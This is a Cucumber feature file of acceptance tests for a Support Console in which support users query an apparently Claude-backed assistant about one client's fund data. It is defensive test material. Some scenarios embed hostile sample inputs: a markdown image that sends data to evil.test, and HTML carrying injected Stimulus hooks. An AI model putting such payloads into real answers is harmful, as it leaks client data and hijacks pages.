# Support Console — asking, streaming, stopping, and what the user sees when the machine fails.
# The relay on the support machine is stubbed (features/support/support_console_relay_stub.rb).
# Worked examples: openspec/changes/archive/2026-10-22-support-console/design.md#worked-examples
@rack_test @support_console @sync-http
Feature: Support Console asking

  Background:
    Given the client "Golden Angels" has support access "on"
    And the client "Beta Capital" has support access "on"
    And "Meera" is a support user
    And "Meera" is mapped to "Golden Angels" until "2099-12-31"
    And I am logged in as "Meera"

  # H1 — Happy path: Meera asks about Golden Angels and the answer arrives with its sources and footer
  Scenario: Ask and get an answer
    Given the relay answers "No Q3 entries exist for commitment 9001. Where this comes from: closing balance calculation"
    When I open the Support Console for "Golden Angels"
    And I ask "Why does Ravi K show a zero closing balance in Fund I for Q3?"
    Then I see the answer "No Q3 entries exist for commitment 9001."
    And I see the answer "Where this comes from"
    And the footer shows "Data as of 4 seconds ago · Code version 425c604"
    And Ask is enabled

  # H3 — Happy path: a follow-up resumes the Claude Code session of the first answer
  Scenario: Follow-up resumes the conversation
    Given the relay answers "First answer" and then "Only Q3 is missing"
    When I open the Support Console for "Golden Angels"
    And I ask "Why is the closing balance zero?"
    And I ask "Show only Q3"
    Then I see the answer "Only Q3 is missing"
    And the first turn did not resume any session
    And the relay was asked to resume Claude session "cs-first"

  # H4 — Happy path: the conversation's header names its client and offers no way to switch
  Scenario: Header shows the client
    Given the relay answers "An answer"
    When I open the Support Console for "Golden Angels"
    And I ask "Anything"
    Then I should see "Golden Angels"
    And the brief sent to the relay names only "Golden Angels"

  # H6 — Happy path: asked to fix data, the assistant is told it cannot change anything and describes the fix
  Scenario: Asked to fix data
    Given the relay answers "The commitment amount would need to change to 50,00,000. I cannot make that change."
    When I open the Support Console for "Golden Angels"
    And I ask "Please correct Ravi K's commitment amount to 50,00,000"
    Then I see the answer "I cannot make that change."
    And the brief sent to the relay says "You cannot change anything."

  # E2 — Edge case: an empty question is refused and nothing is sent
  Scenario: Empty question
    When I open the Support Console for "Golden Angels"
    And I press Ask with an empty question
    Then I should see "Please type a question."
    And I see no answer

  # E3 — Edge case: 4,000 characters is accepted, 4,001 is refused
  Scenario: Question length limit
    Given the relay answers "Long question answered"
    When I open the Support Console for "Golden Angels"
    And I ask a question of 4001 characters
    Then I should see "Questions are limited to 4000 characters."
    And I see no answer
    When I ask a question of 4000 characters
    Then I see the answer "Long question answered"

  # E4 — Edge case: a second question while one is running is refused, and Stop replaces Ask
  Scenario: Second question while one is running
    Given "Meera" has a conversation about "Golden Angels" with a turn still running
    When I open that conversation
    Then Stop replaces Ask
    When I post a question to that conversation directly
    Then I should see "Already working on a question in this conversation."
    And the relay was not called

  # E9 — Edge case: Stop ends the running turn, says "Stopped." and re-enables Ask
  Scenario: Stop a running answer
    Given "Meera" has a conversation about "Golden Angels" with a turn still running
    When I open that conversation
    And I press Stop
    Then I see the answer "Stopped."
    And the relay was asked to stop the turn
    And Ask is enabled

  # E10 — Edge case: a question about another client gets the one-client answer, and the brief names only this client
  Scenario: Question about another client
    Given the relay answers "I can only look at Golden Angels in this conversation."
    When I open the Support Console for "Golden Angels"
    And I ask "Compare this with Beta Capital's Fund II"
    Then I see the answer "I can only look at Golden Angels in this conversation."
    And the brief sent to the relay names only "Golden Angels"

  # E11 — Edge case: the machine says a turn is already running for this conversation
  Scenario: Relay reports a running turn
    Given the relay says a turn is already running
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then I see the answer "Already working on a question in this conversation."

  # E12 — Edge case: a deploy between questions shows the new code version in the footer
  Scenario: Code version changes between turns
    Given the relay answers "Before deploy" on code version "1111111aaaa" and then "After deploy" on code version "2222222bbbb"
    When I open the Support Console for "Golden Angels"
    And I ask "First"
    Then the footer shows "Code version 1111111"
    When I ask "Second"
    Then the footer shows "Code version 2222222"

  # E18 — Edge case: replica lag of 60 s is shown normally
  Scenario: Replica lag at the threshold
    Given the relay answers "Fresh enough" with replica lag 60 seconds
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then the footer shows "Data as of 60 seconds ago"
    And the footer is not highlighted

  # E18 — Edge case: replica lag of 61 s is highlighted as a warning
  Scenario: Replica lag over the threshold
    Given the relay answers "A little stale" with replica lag 61 seconds
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then the footer shows "Data as of 61 seconds ago"
    And the footer is highlighted as a warning

  # E21 — Edge case: conversations are listed newest first with their first question
  Scenario: Conversation list order
    Given "Meera" has 3 conversations about "Golden Angels" started on "2026-10-01, 2026-10-12, 2026-10-05"
    When I open the Support Console for "Golden Angels"
    Then the conversations are listed newest first as "Question from 2026-10-12, Question from 2026-10-05, Question from 2026-10-01"

  # X4 — Error case: the machine cannot be reached; the question stays in the box
  Scenario: Machine unreachable
    Given the relay is unreachable
    When I open the Support Console for "Golden Angels"
    And I ask "Why is the balance zero?"
    Then I see the answer "The Support Console is unavailable right now. Try again in a few minutes."
    And the question box contains "Why is the balance zero?"

  # X5 — Error case: the machine answers with a server error
  Scenario: Machine error
    Given the relay fails with status 500
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then I see the answer "The Support Console is unavailable right now. Try again in a few minutes."

  # X7 — Error case: the stream goes quiet; the turn is stopped on the machine and the user told
  Scenario: Stream stalls
    Given the relay stream goes quiet
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then I see the answer "That took too long. Try a narrower question."
    And the relay was asked to stop the turn

  # X9 — Error case: a Bash attempt denied on the machine does not stop the answer arriving
  Scenario: Shell command attempt
    Given the relay answers "I cannot run commands on the server." after a denied Bash attempt
    When I open the Support Console for "Golden Angels"
    And I ask "Run ls on the server"
    Then I see the answer "I cannot run commands on the server."

  # X11 — Error case: the data tool finds it is not connected to a replica
  Scenario: Not a replica
    Given the relay reports the error "not_a_replica"
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then I see the answer "The Support Console is unavailable right now. Try again in a few minutes."

  # X12 — Error case: the replica cannot be reached
  Scenario: Replica unreachable
    Given the relay reports the error "db_unavailable"
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then I see the answer "The Support Console is unavailable right now. Try again in a few minutes."

  # X13 — Error case: a turn goes only to this environment's relay, signed with this environment's secret
  Scenario: Environments are separate
    Given the relay answers "An answer"
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then the turn was sent only to this environment's relay, correctly signed

  # E25 — Edge case: a live update that fails to render is reported once and the saved answer shows on reload
  Scenario: Live update fails to render
    Given the relay answers "Saved even though the live update failed"
    And live updates fail to render
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    And I open the Support Console for "Golden Angels" conversation again
    Then I see the answer "Saved even though the live update failed"
    And the last turn is completed

  # E27 — Edge case: a turn left running by a restart is closed when the next question arrives, which then runs
  Scenario: Stale turn does not block the next question
    Given "Meera" has a conversation about "Golden Angels" with a turn still running
    And that running turn started 21 minutes ago
    And the relay answers "Fresh answer after the interruption"
    When I open that conversation
    And I post a question to that conversation directly
    Then I see the answer "The answer was interrupted. Please ask again."
    And I see the answer "Fresh answer after the interruption"

  # E29 — Edge case: Sonnet is the default; choosing Opus sends it, labels the answer, and the conversation keeps the choice
  Scenario: Choosing the model
    Given the relay answers "Answered by Sonnet" and then "Answered by Opus"
    When I open the Support Console for "Golden Angels"
    Then the model selector shows "Sonnet"
    When I ask "First question"
    Then the relay was asked to use "sonnet"
    And the answer is labelled "Sonnet"
    When I choose the model "Opus"
    And I ask "Harder question"
    Then the relay was asked to use "opus"
    And the answer is labelled "Opus"
    And the model selector shows "Opus"

  # E31 — Edge case: a forged model value in the request is treated as Sonnet
  Scenario: Forged model value
    Given the relay answers "Answered anyway"
    When I post a question about "Golden Angels" directly with the model "anthropic.claude-fable-5-1"
    Then the relay was asked to use "sonnet"

  # X23 — Error case: a follow-up is re-checked against the support user who asked it, not the conversation's starter
  Scenario: Follow-up asker's access ended while queued
    Given "Ravi" is a support user
    And "Ravi" is mapped to "Golden Angels" until "2099-12-31"
    And "Ravi" has a queued follow-up in "Meera"'s conversation about "Golden Angels"
    And "Ravi"'s mapping to "Golden Angels" is disabled
    When the queued turn runs
    Then the queued turn is refused with "Your support access to Golden Angels has ended."

  # X24 — Error case: an answer cannot load a remote image or reach into the page; plain links open on a click
  Scenario: Remote image in an answer
    Given the relay answers "Total is 5 ![x](https://evil.test/?d=PAN123) see [help](https://caphive.com/help)"
    When I open the Support Console for "Golden Angels"
    And I ask "What is the total?"
    Then I see the answer "Total is 5"
    And the answer shows no image
    And the answer links to "https://caphive.com/help" in a new tab

  # H13 — Happy path: an answer in the brief's layout renders with Bootstrap structure — Summary card, Key figures stat cards, a table, a callout, a Questions list
  Scenario: Answer laid out with cards, stats, a table and questions
    Given the relay answers:
      """
      ## Summary
      TSTF2 paid more than Call 2 asked for.

      ## Key figures
      - **Called:** 5,00,000
      - **Paid:** 5,50,000

      ## Details
      | Investor | Paid |
      |---|---|
      | TSTF2 | 5,50,000 |

      > The extra 50,000 sits unallocated.

      ## Questions
      - Was a refund issued?

      ## Where this comes from
      - app/packs/funds/capital_calls/models/capital_remittance.rb
      """
    When I open the Support Console for "Golden Angels"
    And I ask "Why is TSTF2 marked Overpaid?"
    Then the answer shows a "Summary" card saying "TSTF2 paid more than Call 2 asked for."
    And the answer shows the stat card "Called" with "5,00,000"
    And the answer shows the stat card "Paid" with "5,50,000"
    And the answer shows a Bootstrap table with the cell "TSTF2"
    And the answer shows "The extra 50,000 sits unallocated." as a callout
    And the answer lists the question "Was a refund issued?"
    And I see the answer "Where this comes from"
    And the question is shown as a Bootstrap bubble
    And the brief sent to the relay says "## Key figures"

  # E40 — Edge case: an answer without the layout's headings (written before the layout existed) still renders, with no cards
  Scenario: Answer without the layout headings
    Given the relay answers "No Q3 entries exist for commitment 9001."
    When I open the Support Console for "Golden Angels"
    And I ask "Why is the closing balance zero?"
    Then I see the answer "No Q3 entries exist for commitment 9001."
    And the answer shows no stat cards

  # E41 — Edge case: a Key figures bullet that is not "Label: value" stays a bullet; the others still become stat cards
  Scenario: Key figures bullet of another shape
    Given the relay answers:
      """
      ## Key figures
      - **Called:** 5,00,000
      - figures for Q4 are not in yet
      """
    When I open the Support Console for "Golden Angels"
    And I ask "What was called?"
    Then the answer shows the stat card "Called" with "5,00,000"
    And the answer shows the bullet "figures for Q4 are not in yet"

  # E42 — Edge case: sub-headings inside "Where this comes from" stay inside the collapsed section
  Scenario: Sources with their own sub-headings
    Given the relay answers:
      """
      ## Summary
      No Q3 entries exist.

      ## Where this comes from
      ### Code
      - app/packs/funds/account_entries/models/account_entry.rb
      ### Lookups
      - account_entries for commitment 9001
      """
    When I open the Support Console for "Golden Angels"
    And I ask "Why is the closing balance zero?"
    Then the sources section holds "### Code" and "account_entries for commitment 9001"

  # H14 — Happy path: an answer's follow-ups show as buttons above the box, not in the answer
  Scenario: Follow-ups above the box
    Given the relay answers:
      """
      ## Summary
      4 investor accesses are unapproved.

      ## Follow-ups
      - List the 4 unapproved accesses with investor, email and fund
      - Which of them were granted in the last 30 days?

      ## Where this comes from
      - investor_accesses where approved = 0
      """
    When I open the Support Console for "Golden Angels"
    And I ask "How many investor accesses are unapproved?"
    Then the follow-ups above the box are:
      | List the 4 unapproved accesses with investor, email and fund |
      | Which of them were granted in the last 30 days?               |
    And a follow-up puts "Which of them were granted in the last 30 days?" in the box
    And the answer does not show "Follow-ups"
    And the answer does not show "List the 4 unapproved accesses"
    And the brief sent to the relay says "## Follow-ups"

  # E43 — Edge case: when the latest turn failed, the earlier answer's follow-ups are not offered; the question is back in the box
  Scenario: No follow-ups after a failed turn
    Given the relay answers this and then fails with status 500:
      """
      ## Summary
      4 are unapproved.

      ## Follow-ups
      - List them
      """
    When I open the Support Console for "Golden Angels"
    And I ask "How many are unapproved?"
    Then the follow-ups above the box are:
      | List them |
    When I ask "And last month?"
    Then I see the answer "The Support Console is unavailable right now. Try again in a few minutes."
    And there are no follow-ups above the box
    And the question box contains "And last month?"

  # E44 — Edge case: four follow-ups; only the first three are offered
  Scenario: At most three follow-ups
    Given the relay answers:
      """
      ## Follow-ups
      - First?
      - Second?
      - Third?
      - Fourth?
      """
    When I open the Support Console for "Golden Angels"
    And I ask "What next?"
    Then the follow-ups above the box are:
      | First?  |
      | Second? |
      | Third?  |

  # X37 — Error case: markup written in a follow-up is shown as plain text, never as markup
  Scenario: Follow-up with markup
    Given the relay answers:
      """
      ## Follow-ups
      - Show **bold** <b data-controller="evil">rows</b> [here](https://evil.test)
      """
    When I open the Support Console for "Golden Angels"
    And I ask "What next?"
    Then the follow-ups above the box are:
      | Show bold rows here |
    And no follow-up holds markup

  # X36 — Error case: a class or Stimulus hook written into an answer is stripped; only the app's own Bootstrap classes are added
  Scenario: Answer tries to style or wire up the page
    Given the relay answers:
      """
      ## Summary
      Total is 5.

      <p class="d-none" data-controller="evil">Hidden text</p>
      """
    When I open the Support Console for "Golden Angels"
    And I ask "What is the total?"
    Then the answer shows a "Summary" card saying "Total is 5."
    And the answer has no class or data attribute of its own around "Hidden text"

  # X25 — Edge case: the Claude session id is stored as soon as the machine sends it, even when the turn then ends without an answer
  Scenario: Claude session kept for a turn without an answer
    Given the relay starts Claude session "cs-cut" and then the stream ends
    When I open the Support Console for "Golden Angels"
    And I ask "Why is the closing balance zero?"
    Then I see the answer "The Support Console is unavailable right now."
    And the last turn records Claude session "cs-cut"

  # X26 — Edge case: a turn that waited long in the queue but started recently is still running, not stale
  Scenario: Queue wait does not make a running turn stale
    Given "Meera" has a conversation about "Golden Angels" with a turn still running
    And that running turn was queued 25 minutes ago and started 5 minutes ago
    When I open that conversation
    And I post a question to that conversation directly
    Then I should see "Already working on a question in this conversation."
    And the relay was not called

  # X28 — Error case: the Claude subscription's usage limit is reached; the user is told so, the question stays in the box, nobody is alerted
  Scenario: Usage limit reached
    Given the relay reports the error "usage_limit"
    And error reports are watched
    When I open the Support Console for "Golden Angels"
    And I ask "Why is the closing balance zero?"
    Then I see the answer "The Support Console has reached its usage limit. Try again later."
    And the question box contains "Why is the closing balance zero?"
    And no error report was sent

  # X29 — Error case: the subscription token expired or was revoked; the user sees "unavailable" and the team is told to renew the token
  Scenario: Subscription token expired
    Given the relay reports the error "auth_failed"
    And error reports are watched
    When I open the Support Console for "Golden Angels"
    And I ask "Why?"
    Then I see the answer "The Support Console is unavailable right now. Try again in a few minutes."
    And an error report says "renew the Claude token"

  # X33 — Edge case: the final answer and its completed state reach the open page without a reload
  Scenario: Final answer reaches the open page
    Given the relay answers "TSTF2 paid more than Call 2 asked for." after looking up data
    And live updates are recorded
    When I open the Support Console for "Golden Angels"
    And I ask "Why is TSTF2 marked Overpaid?"
    Then the last live update of the answer shows "TSTF2 paid more than Call 2 asked for." as completed
